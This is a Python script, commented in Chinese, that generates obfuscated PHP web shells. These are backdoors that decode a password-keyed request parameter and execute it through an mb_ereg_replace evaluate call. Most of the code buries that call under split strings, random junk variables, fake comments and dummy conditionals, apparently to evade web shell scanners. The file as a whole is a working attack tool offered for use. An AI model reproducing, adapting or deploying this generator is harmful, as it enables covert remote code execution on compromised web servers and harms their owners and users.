import random
import string


# 获取随机字符
def getRandom(n: int):

    total = list(string.ascii_letters + string.digits + '_')
    random.shuffle(total)
    if (n > 0):
        rand = (string.ascii_letters + '_')[random.randint(0, 52)]
        for x in range(n - 1):
            rand += total[random.randint(0, 62)]
        return rand
    return False


# 对分解好的变量名称
def getChangeText(value: list):

    result = []
    for each in value:
        result.append("'" + each + "'")
    return result


# 获取唯一变量名
def getUnquie(n: int, unquie: list):

    rand = getRandom(n=n)
    while rand in unquie:
        rand = getRandom(n=n)

    return rand


# 注释混淆
def getAdd_one(value: str, unquie: list):

    formats = {
        0: "/*{x}*={z};**{y}={y}*/{t1}/*{x}=={x};!{y};*/",
        1: "/*if(/*{x}={y},{t1})if({x}-{z}=={y}){x}.={z};*/{t2}/**{y}={z}*/",
        2: "{t1}/*{x}!={t2};{y}++;*/",
        3: "/*{x}={x}.{y};!{t1}={y}*/{t2}"
    }

    length = len(formats)
    index = random.randint(0, length - 1)
    select = formats[index]

    if (index == 0):
        x = getUnquie(n=random.randint(1, len(value) // 2 + 3), unquie=unquie)
        y = getUnquie(n=random.randint(1, len(value) // 2 + 3), unquie=unquie)
        z = getUnquie(n=random.randint(1, len(value) // 2 + 3), unquie=unquie)
        unquie.append(x)
        unquie.append(y)
        unquie.append(z)
        return select.format(
            x="$" + x,
            y="$" + y,
            z="$" + z,
            t1=value
        ), unquie

    if (index == 1):
        x = getUnquie(n=random.randint(1, len(value) // 2 + 3), unquie=unquie)
        y = getUnquie(n=random.randint(1, len(value) // 2 + 3), unquie=unquie)
        z = getUnquie(n=random.randint(1, len(value) // 2 + 3), unquie=unquie)
        unquie.append(x)
        unquie.append(y)
        unquie.append(z)
        return select.format(
            x="$" + x,
            y="$" + y,
            z="$" + z,
            t1=value,
            t2=value
        ), unquie

    if (index == 2):
        x = getUnquie(n=random.randint(1, len(value) // 2 + 3), unquie=unquie)
        y = getUnquie(n=random.randint(1, len(value) // 2 + 3), unquie=unquie)
        unquie.append(x)
        unquie.append(y)
        return select.format(
            x="$" + x,
            y="$" + y,
            t1=value,
            t2=value
        ), unquie

    if (index == 3):
        x = getUnquie(n=random.randint(1, len(value) // 2 + 1), unquie=unquie)
        y = getUnquie(n=random.randint(1, len(value) // 2 + 1), unquie=unquie)
        unquie.append(x)
        unquie.append(y)
        return select.format(
            x="$" + x,
            y="$" + y,
            t1=value,
            t2=value
        ), unquie


# 结构混淆
def getAdd_two(value: str, unquie: list):

    formats = {
        0: "if({x}=={y})if({t1})!{t2};",
        1: "{x}=={y}?{t1}:!{t2};",
        2: "!{x};{t1};{x}={y};",
        3: "{x}={y};{y}={z};{t1};{y}={x};"
    }

    length = len(formats)
    index = random.randint(0, length - 1)
    select = formats[index]

    if (index == 0):
        x = getUnquie(n=random.randint(1, len(value) // 4 + 5), unquie=unquie)
        y = getUnquie(n=random.randint(1, len(value) // 4 + 5), unquie=unquie)
        unquie.append(x)
        unquie.append(y)
        return select.format(
            x="$" + x,
            y="$" + y,
            t1=value,
            t2=value
        ), unquie

    if (index == 1):
        x = getUnquie(n=random.randint(1, len(value) // 4 + 5), unquie=unquie)
        y = getUnquie(n=random.randint(1, len(value) // 4 + 5), unquie=unquie)
        unquie.append(x)
        unquie.append(y)
        return select.format(
            x="$" + x,
            y="$" + y,
            t1=value,
            t2=value
        ), unquie

    if (index == 2):
        x = getUnquie(n=random.randint(1, len(value) // 4 + 5), unquie=unquie)
        y = getUnquie(n=random.randint(1, len(value) // 4 + 5), unquie=unquie)
        unquie.append(x)
        unquie.append(y)
        return select.format(
            x="$" + x,
            y="$" + y,
            t1=value
        ), unquie

    if (index == 3):
        x = getUnquie(n=random.randint(1, len(value) // 4 + 5), unquie=unquie)
        y = getUnquie(n=random.randint(1, len(value) // 4 + 5), unquie=unquie)
        z = getUnquie(n=random.randint(1, len(value) // 4 + 5), unquie=unquie)
        unquie.append(x)
        unquie.append(y)
        unquie.append(z)
        return select.format(
            x="$" + x,
            y="$" + y,
            z="$" + z,
            t1=value
        ), unquie


# 收尾混淆
def getAdd_end(value: str, unquie: list):

    rand = getUnquie(n=random.randint(1, len(value) + 1), unquie=unquie)
    unquie.append(rand)
    result = value + "=$" + rand + ";" if value[0] == "$" else ""
    return result, unquie


# 分解变量名
def getSplit(words: list, r: int):

    re = []
    for element in words:
        if(len(element) == 1):
            rand = 1
        else:
            rand = random.randint(1, len(element) // r)
        base = len(element) // rand
        content = element
        space = []
        for x in range(rand):
            space.append(element[:base])
            element = element[base:]
        if ("".join(space) != content):
            space.append(element)
        re.append(getChangeText(space))
    return re


# 扩展分解的变量名
def getExtend(value: str, s: list, length: int, min: int, max: int):

    re = [value]
    for x in range(length):
        rand = getUnquie(n=random.randint(min, max), unquie=s)
        re.append(rand)
        s.append(rand)
    return re, s


# 开始随机组合混淆
def getGroup(value: list, group: list, keyword: list, unquie: list, p: int):

    result = ""
    key_value = {}
    length = len(group)
    length_group = [len(each) for each in group]
    finish = False
    while not finish:
        group_index = random.randint(0, length - 1)
        word_index = random.randint(0, length_group[group_index] - 1)
        shuffle_index = len(value[group_index][word_index])
        if (shuffle_index > 1):
            _ = value[group_index][word_index].pop()

            if (random.randrange(100) <= p):
                text_add_one, unquie = getAdd_one(
                    value="$" + _ + "=" + group[group_index][word_index], unquie=unquie)
                text_add_two, unquie = getAdd_two(
                    value=text_add_one, unquie=unquie)
            else:
                text_add_two, unquie = getAdd_two(
                    value="$" + _ + "=" + group[group_index][word_index], unquie=unquie)

            text_add_end_one, unquie = getAdd_end(
                value=group[group_index][word_index], unquie=unquie)
            text_add_end_two, unquie = getAdd_two(
                value=text_add_end_one, unquie=unquie)

            result += text_add_two + text_add_two

            group[group_index][word_index] = "$" + _

        else:
            length_group[group_index] = length_group[group_index] - 1
            if (length_group[group_index] == 0):
                value.pop(group_index)
                length_group.pop(group_index)
                key_value.update(
                    {keyword.pop(group_index): group.pop(group_index)})
                length = length - 1
                if (length == 0):
                    break

    return result, key_value, unquie


# 获取混淆的变量声明
def getPHP(words: list, r: int, min_int: int,
           max_int: int, length: int = 5, p: int = 33):

    unquie = []
    result = []
    group = getSplit(words=words, r=r)
    for word in group:
        word_shuffle = []
        for x in range(len(word)):
            _, unquie = getExtend(
                value=word[x], s=unquie, length=length, min=min_int, max=max_int)
            word_shuffle.append(_)
        result.append(word_shuffle)
    phptext, phpdict, unquie = getGroup(
        value=result, group=group, keyword=words, unquie=unquie, p=p)

    return phptext, phpdict, unquie


# 拼装 mbereg_replace('.*','\0',$_METHOD[PASS],'mer'); 语句
def getEval(phptext: str, phpdict: dict, rule: dict,
            unquie: list, rand_line: int = 3, rand_len: int = 10):

    dict_list = {}

    # 生成头部混淆

    rand_shuffle = []
    for line in range(rand_line):
        rand_str = getUnquie(n=rand_len, unquie=unquie)
        rand_shuffle.append(rand_str)
        unquie.append(rand_str)

    php_rand_text, php_rand_dict, unquie = getPHP(words=rand_shuffle, r=rand_len // 2 + 1,
                                                  min_int=rand_len // 5 + 1, length=3, max_int=rand_len // 5 + 3,
                                                  p=10)
    result = php_rand_text + phptext

    for key in rule.keys():
        dict_list[key] = [[], ""]
        for word in phpdict[rule[key]]:
            text, unquie = getAdd_one(value=word, unquie=unquie)
            dict_list[key][0].append(text)
        dict_list[key][1] = ".".join(dict_list[key][0])

    func_tag = getUnquie(
        n=len(dict_list["FUNCTION"][1]) % 10 + 5, unquie=unquie)
    unquie.append(func_tag)
    func_ok, unquie = getAdd_two(
        value="$" + func_tag + "=" + dict_list["FUNCTION"][1], unquie=unquie)
    func_tag_ok, unquie = getAdd_one(value="$" + func_tag, unquie=unquie)

    method_tag = getUnquie(n=len(dict_list["METHOD"][1]), unquie=unquie)
    unquie.append(method_tag)
    method_ok, unquie = getAdd_two(
        value="$" + method_tag + "=" + dict_list["METHOD"][1], unquie=unquie)
    method_tag_ok, unquie = getAdd_one(
        value="{$" + method_tag + "}", unquie=unquie)

    func2_tag = getUnquie(
        n=len(dict_list["FUNCTION2"][1]) % 10 + 5, unquie=unquie)
    unquie.append(func2_tag)
    func2_ok, unquie = getAdd_two(
        value="$" + func2_tag + "=" + dict_list["FUNCTION2"][1], unquie=unquie)
    func2_tag_ok, unquie = getAdd_one(value="$" + func2_tag, unquie=unquie)

    result += func_ok + method_ok + func2_ok

    func_eval = func_tag_ok + "(" + dict_list["PARAM1"][1] + "," + dict_list["PARAM2"][
        1] + "," + func2_tag_ok + "($" + method_tag_ok + "[" + dict_list["PASS"][1] + "]" + ")," + \
        dict_list["PARAM3"][1] + ");"

    result += func_eval

    # 生成尾部混淆

    rand_shuffle = []
    for line in range(rand_line):
        rand_str = getUnquie(n=rand_len, unquie=unquie)
        rand_shuffle.append(rand_str)
        unquie.append(rand_str)

    php_rand_text, php_rand_dict, unquie = getPHP(words=rand_shuffle, r=rand_len // 2 + 1,
                                                  min_int=rand_len // 5 + 1, length=3, max_int=rand_len // 5 + 3,
                                                  p=10)

    return result + php_rand_text


def getAuto(words: list, rule: dict):
    """

    :param words: 需要混淆的字符串
    :param rule: 对应的字典，只需要改METHOD和PASS就行了
    :return:
    """

    # 每个字符串分解成 Rand(1,[字符串长度]//r) 个子串，
    # 比如 "base64_encode" 在 r = 2 时，分解成 [随机 1 ~ len("base64_encode") // 2] 个字串
    r = 2

    # 随机生成的混淆变量名称长度的范围
    min_int = 3
    max_int = 5

    length = 3
    # 每个子串混淆的变量数，
    # 比如当 length = 3 ，字串 "bas64_e" 会被混淆成 $dsjaiodw = "base64_e"; $ddad_wdhioahiodwa = $dsjaiodw; $xzchioaiodw = $ddad_wdhioahiodwa;
    # 总之就是3次混淆

    p = 10
    # 每个字串注释混淆出现的概率

    rand_line = 3
    # 用来混淆的无用变量数
    # 分别会在头部和尾部混淆

    rand_len = 10
    # 用来混淆的无用变量名称长度

    phptext, phpdict, unquie = getPHP(words=words, r=r, min_int=min_int, length=length, max_int=max_int,
                                      p=p)

    result = getEval(phptext=phptext, phpdict=phpdict, rule=rule, unquie=unquie, rand_line=rand_line,
                     rand_len=rand_len)

    return result


def get_php(keyword: int, passwd: str, salt: str):

    method = ["_GET", "_POST", "_COOKIE", "_SERVER"]
    passwd = "HTTP_" + str(passwd).upper() if keyword == 6 else str(passwd)

    rule = {
        "METHOD": method[keyword - 3],
        "PASS": passwd,
        "FUNCTION": "mbereg_replace",
        "FUNCTION2": "dept",
        "PARAM1": ".*",
        "PARAM2": "\\0",
        "PARAM3": "mer"
    }

    words = [
        method[keyword - 3],
        passwd,
        "mbereg_replace",
        "dept",
        "mer",
        ".*",
        "\\0"
    ]

    header = """<?php\nfunction dept($data,$salt="%s",$change=0x80){$data=base64_decode($data);$saltm = md5($salt);$len = strlen($data);$pass=strrev(str_rot13(substr(strrev($data^str_repeat($saltm,ceil($len / 32)) ^ str_repeat(chr($change),$len)),0,-32)));return $pass;}""" % (
        salt)

    result = getAuto(words=words, rule=rule)
    return header + result
